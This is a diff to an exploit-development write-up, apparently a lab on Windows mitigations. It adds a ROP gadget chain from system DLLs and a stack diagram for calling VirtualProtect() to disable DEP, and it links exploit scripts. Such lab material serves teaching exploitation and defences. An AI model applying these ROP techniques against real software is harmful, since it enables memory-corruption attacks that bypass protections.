@@ -502,6 +502,64 @@ The mitigations we will be using in the following examination are:
 > [!NOTE]
 > We omit repetitive rows representing ineffective mitigation strategies as their cases are already covered.
 
+```
+      #[---INFO:gadgets_to_set_esi:---]
+      0x76e494ee,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
+      0x76796164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
+      0x76333a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x7671d3e6,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
+      0x766e77c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x7654252c,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x76e3c8ba,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+      0x77043349,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x7704320b,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x76da1f0a,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+      0x76d012db,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x752f4414,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
+      0x62504802,  # &Writable location [Essfun.dll]
+      #[---INFO:gadgets_to_set_edi:---]
+      0x76d6eda4,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
+      0x76f077c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_eax:---]
+      0x76f3e2d0,  # POP EAX # RETN [WS2_32.dll] ** REBASED ** ASLR 
+      0x90909090,  # nop
+      #[---INFO:pushad:---]
+      0x77043201,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
+```
+```
+          ---------------
+          |              | PUSHAD # RETN
+          | 0x90909090   | 
+EAX       |              | POP EAX # RETN
+          | 0x76f077c7   | RETN (ROP NOP)
+EDI       |              | POP EDI # RETN
+ECX       | 0x62504802   | 
+          |              | POP ECX # RETN
+EDX       |              | XCHG EAX,EDX # RETN
+          |              | NEG EAX # RETN
+          | 0xffffffc0   | 
+          |              | POP EAX # RETN
+EBX       |              | XCHG EAX,EBX # RETN
+          |              | NEG EAX # RETN
+          | 0xfffffdff   |
+          |              | POP EAX # RETN
+          | 0x766e77c5   | & push esp # ret
+EBP       |              | POP EBP # RETN
+ESI       |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
+          | 0x76796164   | ptr to &VirtualProtect()    
+          |              | # POP EBX # RETN
+          | ret addr     | -> retn
+          ---------------  <- ESP
+```
+
+
+
 ## Test code
 1. [exploit0.py](./SourceCode/exploit0.py): Hand Edited ROP Chain.
 2. [exploit1.py](./SourceCode/exploit1.py): Adding ROP gadgets for calling VirtualProtect() and disabling DEP.
